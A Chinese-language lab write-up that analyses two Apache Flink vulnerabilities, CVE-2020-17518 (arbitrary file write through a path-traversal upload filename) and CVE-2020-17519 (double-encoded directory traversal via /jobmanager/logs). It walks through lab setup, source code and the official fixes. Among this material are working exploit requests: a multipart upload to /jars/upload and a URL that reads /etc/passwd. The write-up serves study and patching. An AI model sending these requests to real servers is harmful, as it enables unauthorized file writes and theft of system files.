# Apache Flink Jobmanager目录穿越漏洞(CVE-2020-17519)/任意文件上传漏洞(CVE-2020-17518)

# Apache Flink Jobmanager目录穿越漏洞(CVE-2020-17519)
## 靶场搭建：

可以通过以下两种方式来搭建靶场。

### Docker搭建：
```
https://github.com/vulhub/vulhub/tree/master/flink/CVE-2020-17518
https://github.com/vulhub/vulhub/tree/master/flink/CVE-2020-17519
```

Vulhub已经在Github上提供可以同时满足这两个漏洞的相关docker靶场，版本为1.11.2。

1.	安装docker环境
2.	下载yaml文件
3.	执行命令：` docker-compose up –d` 来启用该docker靶场
4.	在Apache Flink启动后，通过访问http://your-ip:8081 来查看主页
Yaml文件内容：
  
```docker
version: '2'
services:
 flink:
   image: vulhub/flink:1.11.2
   command: jobmanager
   ports:
    - "8081:8081"
    - "6123:6123"
```

 
### 虚拟机搭建：

Flink安装包地址：[https://archive.apache.org/dist/flink/flink-1.11.2/]

选择1.11.2来同时满足两个漏洞的靶场需要。
 
**解压缩：**

`# tar -zxvf flink-1.11.2-bin-scala_2.11.tgz`

将conf/flink-conf.yaml配置文件中的jobmanager.rpc.address修改为服务器ip地址 

`jobmanager.rpc.address: localhost`

添加由本地IDEA生成的调试参数命令行

`-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5555`
 
**启动Flink服务：**

```
# cd ../bin
# ./start-cluster.sh  
```

查看调试端口是否已经开放

```
└─$ netstat -anlp|grep 5555
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 0.0.0.0:5555            0.0.0.0:*               LISTEN      1716/java   
```

 
 
**远程调试：**

通过更改本地IDEA的Debug参数来对flink服务器进行远程调试
 
必须确保服务器本地的JDK版本与Debug参数配置所选的JDK版本一致，否则会导致连接失败
   
连接成功后，开启远程调试

**CVE-2020-17518（1.5.1 <= Apache Flink  <= 1.11.2）**

Flink 在 1.5.1 版本中引入了一个 REST handler，这允许攻击者将已上传的文件写入本地任意位置的文件中，并且可通过一个恶意修改的 HTTP 头将这些文件写入到 Flink 1.5.1 可以访问的任意位置。

## 漏洞复现：

```http
POST /jars/upload HTTP/1.1
Host: localhost:8081
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------13247690941547071692111317477
Content-Length: 244
Connection: close


-----------------------------13247690941547071692111317477
Content-Disposition: form-data; name="jarfile"; filename="../../../../../../tmp/test"
Content-Type: text/plain


test
-----------------------------13247690941547071692111317477-
```

## 漏洞分析：

通过apache官方邮件找到commit地址

```
[hotfix][runtime] A customized filename can be specified through Cont…

…ent-Disposition that also allows passing of path information which was not properly handled. This is fixed now.

We just use the filename instead of interpreting any path information that was passed through a custom filename. Two tests were added to verify the proper behavior:
1. a custom filename without path information was used
2. a custom filename with path information was used

The change required adapting the MultipartUploadResource in a way that it is used not as a @ClassRule but as a @rule instead. This enables us to initialize it differently on a per-test level. The change makes the verification of the uploaded files configurable.`
```


官方说明是由于传入参数校验产生问题。

通过抓包获得传入接口：

```http
GET /jars/upload HTTP/1.1
Host: localhost:8081
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
```

 
**通过官方文档查找接口详细信息：**

```http
/jars/upload
Verb: POST	Response code: 200 OK
Uploads a jar to the cluster. The jar must be sent as multi-part data. Make sure that the "Content-Type" header is set to "application/x-java-archive", as some http libraries do not add the header by default. Using 'curl' you can upload a jar via 'curl -X POST -H "Expect:" -F "jarfile=@path/to/flink-job.jar" http://hostname:port/jars/upload'.
Request
{}
Response
            
{
  "type" : "object",
  "id" : "urn:jsonschema:org:apache:flink:runtime:webmonitor:handlers:JarUploadResponseBody",
  "properties" : {
    "filename" : {
      "type" : "string"
    },
    "status" : {
      "type" : "string",
      "enum" : [ "success" ]
    }
  }
}   
```

 
在上传路径的实现方法处，可以看到getFilename()函数接受到前端传递的参数并存放在filename当中

```java
if (data.getHttpDataType() == InterfaceHttpData.HttpDataType.FileUpload) {
	final DiskFileUpload fileUpload = (DiskFileUpload) data;
	checkState(fileUpload.isCompleted());

	final Path dest = currentUploadDir.resolve(fileUpload.getFilename());
	fileUpload.renameTo(dest.toFile());
	LOG.trace("Upload of file {} complete.", fileUpload.getFilename());
```
之后将参数filename传递给resolve()函数，在resolve()中，filename与系统路径拼接将值存入dest当中

```java
public String getFilename() {
    return this.filename;
}
``` 

最后dest储存拼接上传路径并传递给了fileUpload.renameTo()方法

```java
default Path resolve(String other) {
    return resolve(getFileSystem().getPath(other));
}
``` 

最后在rename()函数中返回上传路径，并重命名保存至temp目录下作为缓存文件

```java
public boolean renameTo(File dest) {
    SecurityManager security = System.getSecurityManager();
    if (security != null) {
        security.checkWrite(path);
        security.checkWrite(dest.path);
    }
    if (dest == null) {
        throw new NullPointerException();
    }
    if (this.isInvalid() || dest.isInvalid()) {
        return false;
    }
    return fs.rename(this, dest);
}
```

Rename()函数对上传文件f1，和缓存文件f2都进行了写入

```java
public boolean rename(File f1, File f2) {
    // Keep canonicalization caches in sync after file deletion
    // and renaming operations. Could be more clever than this
    // (i.e., only remove/update affected entries) but probably
    // not worth it since these entries expire after 30 seconds
    // anyway.
    cache.clear();
    prefixCache.clear();
    return rename0(f1, f2);
}
```
## 修复：

官方使用getName()函数对上传路径进行了截断，只取得文件名”../”和上传目录名都被忽略了

```java
final Path dest = currentUploadDir.resolve(new File(fileUpload.getFilename()).getName());
fileUpload.renameTo(dest.toFile());
```

# CVE-2020-17519（1.11.0 <= Apache Flink  <= 1.11.2）

Apache Flink 1.11.0中引入的更改（包括1.11.1和1.11.2）允许攻击者通过JobManager进程的REST接口读取JobManager本地文件系统上的任何文件。

## 漏洞复现：

遍历linux系统下/etc/passwd文件
`http://localhost:8081/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd`
 
## 漏洞分析：

通过apache官方邮件找到commit地址

```
[hotfix][runtime] It was possible to traverse the directory of the ho…

…st through /jobmanager/logs/<path-to-file>.

The <path-to-file> had to be modified in a way that '../' referring to the parent folder needed to be replaced by '..%252f'. This enabled traversing the directory structure relative to the ./logs folder, e.g. /jobmanager/logs/..%252f/README.txt would return the content of the README.txt located in the FLINK_HOME folder (assuming Flink's default folder structure).

This is fixed now. The passed path is ignored in the same way as it's already done for the TaskManagerCustomLogHandler.
```

从commit中可以看出该漏洞是通过使用'..%252f'来替换'../'导致可以遍历./log文件夹相关的目录结构
通过文档说明找到对应class的位置

```java
try {
	handlerRequest = new HandlerRequest<R, M>(
		request,
		untypedResponseMessageHeaders.getUnresolvedMessageParameters(),
		routedRequest.getRouteResult().pathParams(),
		routedRequest.getRouteResult().queryParams(),
		uploadedFiles.getUploadedFiles());
} catch (HandlerRequestException hre) {
	log.error("Could not create the handler request.", hre);
	throw new RestHandlerException(
		String.format("Bad request, could not parse parameters: %s", hre.getMessage()),
		HttpResponseStatus.BAD_REQUEST,
		hre);
}
```
 
通过发送请求


`http://localhost:8081/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd`

对于CVE-2020-17519来说，整个漏洞的原理比较简单

系统接受request并对handlerRequest对象进行初始化，routedRequest.getRouteResult()将初始化的值存入result，getRouteResult()对request进行第一次解码，最后传递给pathRarams()函数并将第二次解码的结果储存在pathParam变量中

```java
routedRequest.getRouteResult().pathParams(),
routedRequest.getRouteResult().queryParams(),
```
```java
public RouteResult<T> getRouteResult() {
	return result;
}
```

Handler request的值被传递到org.apache.flink.runtime.rest.handler.cluster.JobManagerCustomLogHandler#getFile并被储存在file变量中，读取file中储存的值作为相应内容

```java
	protected CompletableFuture<Void> respondToRequest(ChannelHandlerContext ctx, HttpRequest httpRequest, HandlerRequest<EmptyRequestBody, M> handlerRequest, RestfulGateway gateway) {
		File file = getFile(handlerRequest);
		if (file != null && file.exists()) {
			try {
				HandlerUtils.transferFile(
					ctx,
					file,
					httpRequest);
			} catch (FlinkException e) {
				throw new CompletionException(new FlinkException("Could not transfer file to client.", e));
			}
			return CompletableFuture.completedFuture(null);
		} else {
			return HandlerUtils.sendErrorResponse(
				ctx,
				httpRequest,
				new ErrorResponseBody("This file does not exist in JobManager log dir."),
				HttpResponseStatus.NOT_FOUND,
				Collections.emptyMap());
		}
	}
```

 
getFile函数提取变量pathRarams中的值储存在filename中并拼接logDir作为返回路径存在file变量中

```java
protected File getFile(HandlerRequest<EmptyRequestBody, FileMessageParameters> handlerRequest) {
	if (logDir == null) {
		return null;
	}
	String filename = handlerRequest.getPathParameter(LogFileNamePathParameter.class);
	return new File(logDir, filename);
```
 
在respondToRequest处取断点可以看到返回的file变量的值已经和logDir拼接并返回

```java
protected CompletableFuture<Void> respondToRequest(ChannelHandlerContext ctx, HttpRequest httpRequest, HandlerRequest<EmptyRequestBody, M> handlerRequest, RestfulGateway gateway) {
		File file = getFile(handlerRequest);
		if (file != null && file.exists()) {
			try {
				HandlerUtils.transferFile(
					ctx,
					file,
					httpRequest);
			} catch (FlinkException e) {
				throw new CompletionException(new FlinkException("Could not transfer file to client.", e));
			}
			return CompletableFuture.completedFuture(null);
 
```

**routedRequest.getRouteResult()的初始化过程**

在org.apache.flink.runtime.rest.handler.router.RouterHandler#channelRead0()中，将request中的uri转存入qsd变量，qsd调用path()函数进行了第一次解码

protected void channelRead0(ChannelHandlerContext channelHandlerContext, HttpRequest httpRequest) {
```java
	if (HttpHeaders.is100ContinueExpected(httpRequest)) {
		channelHandlerContext.writeAndFlush(new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, HttpResponseStatus.CONTINUE));
		return;
	}

	// Route
	HttpMethod method = httpRequest.getMethod();
	QueryStringDecoder qsd = new QueryStringDecoder(httpRequest.uri());
	RouteResult<?> routeResult = router.route(method, qsd.path(), qsd.parameters());
 
```

Path()函数调用decodeComponent函数将qsd变量的值uri进行第一次解码并存入this.path当中，从debug调试器中可以看到从uri到path的变化

```java
public String path() {
    if (this.path == null) {
        this.path = decodeComponent(this.uri, 0, this.pathEndIdx(), this.charset, true);
    }
 
```

将method，path，parameters传递给route()函数来初始化一个routeResult对象

`RouteResult<?> routeResult = router.route(method, qsd.path(), qsd.parameters());`
 
在route()函数中，将this.path变量传递给了decodePathToken()函数进行第二次解码并存入token变量中，此时两次解码都结束了，最后将method,path,queryParameters传入传入route()来获取初始化RouteResult结果

```java
public RouteResult<T> route(HttpMethod method, String path, Map<String, List<String>> queryParameters) {
	MethodlessRouter<T> router = routers.get(method);
	if (router == null) {
		router = anyMethodRouter;
	}

	String[] tokens = decodePathTokens(path);

	RouteResult<T> ret = router.route(path, path, queryParameters, tokens);
```


 
从decodePathTokens()函数中可以看出，decodePathToken()将path进行了二次解码并判断路径上的‘/’进行分割截断并存入encodedTokens数组当中。当攻击者传入编码过的‘/’后，可以绕过对‘/’的检测，最后使用对数组中的参数进行依次解码并返回正常路径

```java
	private String[] decodePathTokens(String uri) {
		// Need to split the original URI (instead of QueryStringDecoder#path) then decode the tokens (components),
		// otherwise /test1/123%2F456 will not match /test1/:p1

		int qPos = uri.indexOf("?");
		String encodedPath = (qPos >= 0) ? uri.substring(0, qPos) : uri;

		String[] encodedTokens = PathPattern.removeSlashesAtBothEnds(encodedPath).split("/");

		String[] decodedTokens = new String[encodedTokens.length];
		for (int i = 0; i < encodedTokens.length; i++) {
			String encodedToken = encodedTokens[i];
			decodedTokens[i] = QueryStringDecoder.decodeComponent(encodedToken);
		}

		return decodedTokens;
	}
```

 
## 修复：

官方通过 File.getName()函数来取得末尾文件名而不是原来的整个文件路径

```java
String filename = handlerRequest.getPathParameter(LogFileNamePathParameter.class);
// wrapping around another File instantiation is a simple way to remove any path information - we're
// solely interested in the filename
String filename = new File(handlerRequest.getPathParameter(LogFileNamePathParameter.class)).getName();
return new File(logDir, filename);
```

 

